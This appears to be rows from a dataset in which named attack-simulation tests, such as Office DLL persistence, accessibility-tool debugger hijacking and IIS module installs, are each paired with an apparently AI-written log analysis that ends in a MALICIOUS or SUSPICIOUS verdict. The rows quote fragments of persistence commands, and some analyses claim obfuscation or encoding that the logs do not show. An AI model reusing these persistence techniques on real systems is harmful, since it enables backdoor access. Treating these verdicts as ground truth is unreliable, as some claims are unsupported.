Given the evidence of suspicious PowerShell activity involving registry manipulation, triggered executions, and potential use of system binaries for avoiding direct detection, there's a strong indication of malfeasance or operational setup consistent with malicious intentions.

**Resolution:** 
- **MALICIOUS** - The logs indicate clear signs of suspicious and potentially harmful activity. The observed use of PowerShell to tweak registry settings for execution persistence through legitimate processes suggests evidence of an intrusion or preparation for lateral movement.

**Guidance on How to Proceed:**
1. **Isolate the Host:** Detach the system from the network to prevent data exfiltration or further spread of malicious activity.
2. **Forensic Investigation:** Conduct a thorough forensic examination of the system to identify additional artifacts of compromise.
3. **Contain and Eliminate Threats:** Identify and contain any further malicious entries or scripts deployed on the host.
4. **Patch and Update:** Ensure all system and software components are updated to the latest secured versions.
5. **Strengthen Monitoring:** Enhance logging and alerting on similar behavior across other systems to proactively combat potential threats.

It's also recommended to report the findings to the organization's security team to assess potential broader impacts and start recovery actions immediately."
Office Application Startup Test Persistence (HKCU),"Based on the logs provided, let's break down the information to identify any potential malicious activity:

### Windows PowerShell Logs:

1. **PowerShell Execution**:
   - The logs capture repeated execution of a PowerShell script that creates a COM Object to interact with ""Word.Application"", checks its installation path, and adds a specific registry value related to Microsoft Office.
   - The script involves switching between handling 64-bit and 32-bit Office versions, and includes a registry operation command (`reg add`), which can be seen in `log entries 1091-1096`.
   - **Suspicious Behavior**: The script writes a DLL (`officetest_x64.dll` or `officetest_x86.dll`) to a temp directory and modifies the registry. This behavior could be indicative of a Trojan or backdoor attempting persistence through malicious DLLs.

### Sysmon Logs:

1. **Process Creation and Execution**:
   - PowerShell and other related processes (`conhost.exe`, `wevtutil.exe`) are executed by the user `SERVER002\\admin_test` at the time related to the suspicious PowerShell execution.
   - The `powershell.exe` command line includes complex scripts and registry modification attempts.
   - **Notable Processes**: 
     - `sppsvc.exe` and `WmiPrvSE.exe` under `NT AUTHORITY\\NETWORK SERVICE`.
     - `MicrosoftEdgeUpdate.exe` indicates an expected application update routine.
     - `taskhostw.exe` and `wermgr.exe` run under `NT AUTHORITY\\SYSTEM`, indicating legitimate system processes.
   - **Suspicious Behavior**: The sequence of PowerShell, `conhost.exe`, and `wevtutil.exe` processes being spawned rapidly in succession might indicate automated or scripted activity consistent with a compromise.

### Analysis:

- **Registry Modification**: The registry modification to include DLLs in temporary paths suggests an attempt to persist malicious code.
- **PowerShell Script**: The PowerShell script's intent to modify registry keys and restart processes (like `WinWord`) aligns with common tactics used in malware activity for persistence or exploitation.
- **Command Execution**: The logs show scripts and processes executed with potentially harmful intentions, such as unauthorized changes to system settings.

### Assessment and Resolution:

**Resolution: MALICIOUS**

The collected logs exhibit strong indicators of potentially malicious activity:
- The use of PowerShell scripts to modify the registry and deploy DLLs from temporary locations is typically associated with malware, given their use for persistence mechanisms.
- The automation and recurrence of related processes, conjoined with the nature of the registry edits, suggest an attack or a compromised compromise behavior actively taking place.
  
**Guidance:**
- **Immediate Action**: Quarantine the machine (Server002) and perform a full malware scan to identify and neutralize any persistent threats.
- **Log Analysis**: Conduct further analysis of the logs to understand the full scope and any potential lateral movement within the network.
- **Review and Harden Security Measures**: Review system permissions, especially for administrative accounts, and implement additional security controls such as restricting script execution and monitoring registry changes. 
- **Patch and Update**: Ensure all software, especially potentially exploited software like Microsoft Office, is up to date with the latest security patches."
Install IIS Module using AppCmd.exe,"Upon analyzing the provided logs, there are several aspects to note for identifying suspicious behavior or indicators of compromise. Here's a detailed analysis of the log entries:

1. **Edge Update Activity:**
   - A high number of events related to `MicrosoftEdgeUpdate.exe` are recorded, indicating active updates or maintenance processes. These processes are common for updating software and do not inherently signify malicious activity, provided they are legitimate and stem from a trusted source like Microsoft.

2. **PowerShell Execution:**
   - Execution of `powershell.exe` by the user `SERVER002\\admin_test` at 2024-10-26 20:48:13. This is somewhat common, but could be suspicious depending on the context, especially if PowerShell is used for administrative tasks. In this case, without visibility into the script or command run, we can't determine the intent or safety conclusively.

3. **Console Host (`conhost.exe`) Execution:**
   - Frequent instances of `conhost.exe` running are seen. This could be typical system behavior due to other processes requiring a console window, but excessive invocation could warrant further checks for scripts or batches being executed.

4. **Command Line Activity:**
   - The use of `cmd.exe` executing `appcmd.exe install module` is seen. While `appcmd.exe` is a legitimate utility for managing IIS (Internet Information Services), the action might require verification to ensure it's authorized and intended.

5. **Installation and Update Processes:**
   - Multiple events correspond to `MicrosoftEdgeUpdateSetup` and `MicrosoftEdgeUpdateComRegisterShell64.exe` executions, which reflect legitimate update processes typically run by Microsoft Edge's update system.

6. **Security and Application Logs:**
   - Lack of entries in these sections generally suggests limited direct evidence of security-related incidents or application warnings/errors within the provided timeframe.

**Assessment:**
- While the logs indicate substantial activity concerning `MicrosoftEdgeUpdate.exe`, all observed entries align with common update patterns for Microsoft's Edge browser, which frequently updates for bug fixes and performance improvements.

- The PowerShell, `cmd.exe`, `conhost.exe`, and `appcmd.exe` entries, while appearing numerous, do not include signs of known malicious command-lines or behaviors like obfuscation, unsolicited data exfiltration, or known bad indicator usage.

**Resolution:**
- **SUSPICIOUS**: Given the extensive activity logging for service processes like EdgeUpdate and frequent execution of administrative consoles, although these might naturally occur due to window operating processes and scheduled updates, they warrant closer examination to confirm they're not leveraged for illicit purposes (e.g., payload delivery or malicious scripting). Logging review consistency and environment rules for admin accounts should be implemented for accuracy.
  
It's recommended to validate the origin of the processes that launched the PowerShell and any scripts that might have been run. A baseline of typical process behavior should be established to better differentiate between normal operations and potentially harmful actions. Furthermore, ensure that software update channels are secure and authenticate the integrity of update packages applied to ensure they're unaltered and from reputable sources."
Attaches Command Prompt as a Debugger to a List of Target Processes,"### Detailed Analysis

#### Identified Anomalies

1. **PowerShell Activity (Suspicious Command Execution)**
   - Multiple PowerShell events indicate execution of a script that modifies the registry entries for several accessibility applications to change their debugger paths to CMD (`C:\\windows\\system32\\cmd.exe`). This technique is a known method for persistence or privilege escalation because it allows the attacker to gain a command prompt with system privileges upon execution of these accessibility tools.
   - The command-line executed (`powershell.exe & {$input_table = ""osk.exe, sethc.exe, utilman.exe, magnify.exe,...}`) is a red flag as it indicates potential misuse of legitimate Windows utilities for unauthorized access or actions.

2. **Windows Event Log Manipulation**
   - The frequent usage of `wevtutil.exe` by the `admin_test` user indicates potential tampering with event logs. This could be an action taken to cover tracks after gaining unauthorized access or performing malicious activities. 

3. **Process Creation and Execution Patterns**
   - There are several `conhost.exe` and `wevtutil.exe` executions tied to `admin_test`. `wevtutil.exe` is being executed multiple times in a short span, possibly indicating attempts to manipulate or extract event logs.
   - `whoami.exe` and `hostname.exe` processes initiated by `wsmprovhost.exe` (Windows Remote Management). This indicates a system reconnaissance activity attempting to gather environment information.

4. **Privilege Escalation Indicators**
   - Event ID 4672 indicates special privileges assigned to the `SYSTEM` user. While this alone is not suspicious, in context with the PowerShell script execution, it supports the potential privilege escalation attempt.

5. **Edge Update Activities**
   - Significant activity around Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`). While frequent edge update activities are generally benign, they could be related if an attacker attempts to manipulate or falsify update processes to introduce malicious software. In this case, they do not directly relate to the observed suspicious behavior but serve as background activities.

#### Assessment of the Situation

The pattern of actions—usage of PowerShell for modifying critical registry keys for accessibility tools debugging, manipulation with event logs, and system reconnaissance suggest attempts at maintaining access and potentially gaining elevated privileges. These activities do not reflect normal administrative activities and indicate a coordinated attempt to subvert security measures and potentially compromise the system.

#### Threat or Risk Identified

The execution of scripts modifying accessibility toolpaths and capturing elevated tokens suggests a clear indication of attempted or successful unauthorized system access, potentially for persistence or greater network compromise.

### Resolution: MALICIOUS

#### Guidance on How to Proceed
1. **Immediate Incident Response**
   - Disconnect the affected system from the network to prevent further lateral movement by the attacker.
   - Initiate a full forensic investigation of the system to confirm compromise and assess the scope.
   - Gather volatile data like memory dumps and active network connections for analysis.

2. **Containment and Eradication**
   - Remove unauthorized users or tools and revert any registry changes.
   - Reset passwords for all administrator and critical service accounts.

3. **Recovery and Monitoring**
   - Rebuild affected systems from known good backups or reinstall the operating system if necessary.
   - Implement more stringent monitoring using SIEM solutions to detect future anomalies.
   - Conduct a review of user account usages and privileges, refining access control policies.

4. **Review Security Posture**
   - Ensure that all systems are updated and patched.
   - Conduct a training and awareness session for IT personnel on recognizing malicious behaviors.
   - Audit all user accounts and privileges more regularly, emphasizing least privilege access and multi-factor authentication.

These actions should mitigate the current issues and prevent potential future compromises."
Azure AD - Create a new user,"Based on the provided Windows event logs from different sources (System, Application, Security, Sysmon, and PowerShell), we can analyze the following to identify potential indicators of malicious activity:

### Key Observations:
1. **Sysmon and PowerShell Logs:**
   - The logs indicate multiple executions of `powershell.exe` with potentially suspicious activities. There is an instance where PowerShell was used to create a new Azure Active Directory user (`New-AzureADUser`). This action executed a script with inline credentials which is a significant red flag, as embedding clear-text credentials within scripts, especially administrative credentials, is not standard operating procedure and is often associated with credential theft or unauthorized account creation.
   - Frequent executions of `wevtutil.exe` and `conhost.exe` under a user account (`SERVER002\admin_test`) in Sysmon logs might suggest log manipulation or attempts to access event logs unauthorizedly.

2. **Security Logs:**
   - Multiple `EventID 4672` logs show instances of special privileges being assigned, which include privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, and more. These privileges are normally restricted to admin operations and their frequent occurrence can be indicative of attempts to escalate privileges or conduct sensitive operations.
   - Repeated `EventID 4624` and `4798` entries, indicating logon events or attempts to enumerate local account information, could indicate reconnaissance.

3. **Indicators of Possible Reconnaisance:**
   - The usage of `whoami.exe` and `hostname.exe` suggests attempts to gather information about the logged-on user and the system, which are common reconnaissance steps during lateral movement.

### Assessment:
- The usage of encoded PowerShell scripts to create an AzureAD user along with the invocation of potentially dangerous privileges suggests that there are potential indicators of compromise.
- The activities involving PowerShell combined with privilege assignments, reconnaissance commands (`whoami`, `hostname`), and accessing or manipulating event logs are suspicious.
- While a single instance might be benign or part of an administrative task, the combination and sequence of events observed in these logs point towards unauthorized or potentially malicious activity.

### Resolution:
- **SUSPICIOUS**: The logs demonstrate suspicious behavior that necessitates further investigation. Specifically, the use of inline credentials in PowerShell scripts, privilege escalations, and activities that could indicate reconnaissance and log manipulation are concerning. A thorough investigation should be conducted to verify if these actions were authorized or part of legitimate administrative operations.

### Guidance for Proceeding:
1. **Immediate Actions:**
   - Isolate the affected host to prevent potential lateral movement or exfiltration.
   - Perform a comprehensive forensic analysis on the machine to capture memory, inspect file system artifacts, and identify any unauthorized access or persistence mechanisms.

2. **Review and Audit:**
   - Check Azure AD logs to identify the source of the unauthorized user creation and verify if other accounts were affected.
   - Review Group Policy and audit settings to ensure privileges like `SeDebugPrivilege` are not erroneously assigned to non-admin users.

3. **Incident Response:**
   - Engage with the incident response team to begin a more extensive audit of domain controller logs and cross-correlated data from SIEM solutions for other indicators of compromise across the network.
   - Update and enforce strict logging and alerting mechanisms to capture all privileged operations and PowerShell executions.

4. **Hygiene and Training:**
   - Ensure security patch management is current and educate users and administrators on secure scripting practices, including avoiding embedding sensitive credentials directly in scripts. Conduct a security review of administrative practices to prevent potential misuse or misconfiguration."
Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"### Detailed Analysis of the Logs:

The logs provided consist of entries from the Application log, Sysmon log, and PowerShell log. Notably, there are no entries from the System or Security logs. Here is the breakdown of suspicious activities observed:

1. **Sysmon Log Analysis**:
   - Multiple instances of `powershell.exe` executed with command lines that indicate the execution of PowerShell scripts copying files and manipulating the Windows Registry. This includes the copying of `PptVBAaddin.ppam` to the user's AppData directory and modification of registry keys related to PowerPoint add-ins.
   - Such actions are commonly associated with malicious activities, often aiming at persistence or exploitation via Office macros.
   - We observe consistency in the user (`SERVER002\\admin_test`) executing these scripts, suggesting a commonality in operations from a potentially compromised account.

2. **PowerShell Log Analysis**:
   - The PowerShell logs confirm the execution of complex commands that include registry manipulation and process control (`Stop-Process` and `Start-Process`) indicating an automated or scripted task being executed.
   - There is evidence of an attempted file copy that failed, as indicated by a ProviderInvocationException, which suggests an incomplete or erroneous attempt to execute the task, a common indicator of scripting errors in attacks.

3. **Application Log Analysis**:
   - The Application logs show entries primarily related to `edgeupdate`, which is benign if related to regular browser update processes, but might be suspicious if coinciding with other non-legitimate processes.

### Suspicion and Assessment:
- The execution of obfuscated scripts through PowerShell, especially ones involving registry alteration and execution of host processes like PowerPoint suggests potential attempt at persistence or execution of macro-based payloads.
- The presence of system commands executed under the guise of routine operations, without accompanying documentation or legitimate context, heightens this suspicion.
- However, without corroborating log entries from system or network traffic indicating external threat behavior (e.g., connections to command-and-control servers or exfiltration activities), the maliciousness cannot be conclusively confirmed.

### Threats or Risks Identified:
- Potential compromise of the `admin_test` account used for executing suspicious scripts.
- Persistence mechanisms may have been set up undetected.

### Guidance:
- **Immediate Response**: Conduct a thorough investigation on the `admin_test` account for recent credentials reset or unauthorized access.
- **Deeper Analysis**: Retrieve additional logs (such as Security event logs, Network logs) and any related artifacts to understand the full scope of actions initiated by these scripts.
- **Preventive Steps**: Ensure PowerShell script execution is monitored and restricted, possibly through script-level logging and the deployment of AppLocker or similar tools to restrict unauthorized script execution.

### Resolution:
Given the evidence outlined, the logs are classified as **SUSPICIOUS**, since they contain activities suggestive of potentially malicious behavior that warrant further investigation. There is a need to confirm or rule out malicious intentions through deeper analysis and additional context."
Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,"### Analysis of Windows Event Logs

Upon reviewing the provided set of Windows event logs, several observations and assessments have been made regarding potential indicators of malicious activity:

#### **Suspicious PowerShell Activity**

1. **PowerShell Commands:**
   - Entries in the PowerShell event logs show a command line that utilizes `New-WebGlobalModule` with the `powershell.exe` command:
     ```plaintext
     powershell.exe & {New-WebGlobalModule -Name DefaultDocumentModule_file -Image %windir%\system32\inetsrv\defdoc.dll}
     ```
   - This command line suggests the registration of a new global module, which can be legitimate but may also be used for purposes such as persistence or privilege escalation.

2. **Process Execution:**
   - PowerShell is executed with high integrity level by the user `SERVER002\admin_test`. This could indicate an administrative-level action, which can be alarming if not part of routine administrative tasks.

#### **Sysmon Events**

1. **Frequent Process Creation:**
   - Numerous Sysmon logs indicate the frequent invocation of `conhost.exe`, `wevtutil.exe`, and PowerShell processes. While common during legitimate operations, high frequency in combination with PowerShell scripts might warrant a deeper inspection to rule out scripting-based attacks or automation exploits.

2. **EdgeUpdate Executions:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and associated setup processes are logged. While these can be routine update processes, the timing and volume in conjunction with unusual PowerShell activity could be worth investigating to ensure they are legitimate update operations and not being used to cloak malicious activity.

#### **Overall Assessment**

- **Suspicious Activities Noted:**
  - The PowerShell script attempting to register a new web module.
  - Frequent and near-simultaneous execution of processes associated with system and console operations, which might suggest automated scripting or external invocation.
  - EdgeUpdate processes might typically be benign, but their occurrences in conjunction with suspicious PowerShell activity must not be overlooked without a deeper context.

#### **Resolution**

Based on the evidence and the lack of explicit malicious indicators (like known malicious file hashes or direct security breaches), the activity can be marked as **SUSPICIOUS**. A more detailed investigation is recommended to either confirm benignity or uncover hidden malicious activities. The focus should particularly be on verifying the legitimacy of the PowerShell commands, the activities of the `admin_test` account, and ensuring that the EdgeUpdate activities are genuine.

#### **Guidance on Further Investigation**

1. **Review PowerShell Activity:**
   - Cross-reference the executed PowerShell scripts and their intended use with sysadmins or IT staff. Ensure these operations are part of expected server activities.

2. **Account and Credentials Check:**
   - Examine the `admin_test` account for unusual patterns or unauthorized access activities. Consider enforcing strict access controls and reviewing recent privilege changes.

3. **Monitor for Recurrence:**
   - Implement logging and monitoring tools to flag any recurrence of these events. Use anomaly detection to highlight deviations from standard activity baselines.

4. **Verify EdgeUpdate Processes:**
   - Ensure that EdgeUpdate activities are legitimate, validly signed by Microsoft, and correlate with known update schedules or maintenance windows.

5. **General Security Hardening:**
   - Review and tighten security configurations, including PowerShell execution policies, to prevent unauthorized or unintended script execution.
   - Regularly apply system patches and updates to minimize exposure to exploitations.

In conclusion, while no definitive evidence of compromise is observed, additional scrutiny and proactive measures can help mitigate any underlying threats."
